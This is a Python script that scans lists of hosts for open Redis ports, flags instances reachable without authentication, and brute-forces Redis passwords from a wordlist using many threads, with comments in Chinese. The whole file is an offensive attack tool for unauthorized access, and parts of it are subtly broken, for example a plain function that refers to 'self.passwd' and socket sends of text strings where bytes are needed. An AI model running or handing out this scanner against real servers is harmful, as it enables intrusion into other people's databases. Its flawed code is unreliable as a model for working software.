#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-05-29 20:13:27
# @Author  : crhua 

import sys
import hashlib
import socket
import redis
from threading import Thread
from optparse import OptionParser


"""
brute redis login
"""

def brute(ip,port,passwd):
	try:
		socket.setdefaulttimeout(5)
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((ip,int(port)))
		sock.send(b"INFO\r\n")
		data = sock.recv(1024)
		if b'redis_version' in data:
			print("{0}:{1} --- 存在redis未授权访问".format(ip,port))
		else: 
			with open(self.passwd,'r') as f:
				passwds = f.readlines()
			for p in passwds:
				p = p.strip()
				socket.setdefaulttimeout(3)
				sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
				sock.connect((ip,port))
				sock.send("AUTH {0}\r\n".format(p))
				data = sock.recv(1024)
				if b'+OK' in data:
					print("{0}:{1} --- redis口令为 {2}".format(ip,port,p))
	except Exception as e:
		print(e)



def run(func,threadnum,ips,port,passwd):
	for i in range(1,threadnum + 1):
		threads = [Thread(target=func,args=(i,port,passwd)) for i in ips ]
	for t in threads:
		t.start()	
	for t in threads:
		t.join()

def scan(ip,port,filename):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(2)
	try:
		res = s.connect_ex((ip,int(port)))
		if res == 0:
			with open(filename,'a+') as f:
				f.write("{0}\n".format(ip))
	except:
		pass


if __name__ == '__main__':
	#帮助
	usage = "Usage: python %prog [options] args"
	parser = OptionParser(usage,version="%prog 0.1 ")
	parser.add_option("-t", dest="host", help="target host")
	parser.add_option("-p", dest="port", default="6379", help="target port")
	parser.add_option("-P", dest="passwd", help="passwd dic")
	parser.add_option("-a", dest="hosts" , help="target hosts file")
	options,args = parser.parse_args()

	"""
	获取用户字典 -P -p
	"""
	if options.passwd:
		passwd = options.passwd
	else:
		print("Please specify -P parameters")
		sys.exit(0)

	if options.port:
		port = options.port

	"""
	tmp_list 存放所有文件内的ip
	last_list 存放只开放redis的ip
	threadnum 线程数，默认50
	"""
	tmp_list = []
	last_list = []
	threadnum = 50

	if options.host:
		host = options.host
		brute(host, port, passwd)
	elif options.hosts:
		file_path = options.hosts
		with open(file_path,'r') as f:
			_tmp = f.readlines()
		for i in _tmp:
			i = i.strip()
			tmp_list.append(i)
		f.close()
		# print(tmp_list)
		"""
		多线程获取端口开放
		"""
		file_name = "{0}_redis.txt".format(port)
		for i in range(10):
			threads = [Thread(target=scan,args=(u,port,file_name,)) for u in tmp_list]
		for t in threads:
			t.start()
		for t in threads:
			t.join()

		"""
		暴力破解redis
		"""
		with open(file_name,'r') as f:
			_last = f.readlines()
		for i in _last:
			i = i.strip()
			last_list.append(i)
		# print(last_list)
		run(brute, threadnum, last_list, port, passwd)

	else:
		print("Error! Please use -h param")
		

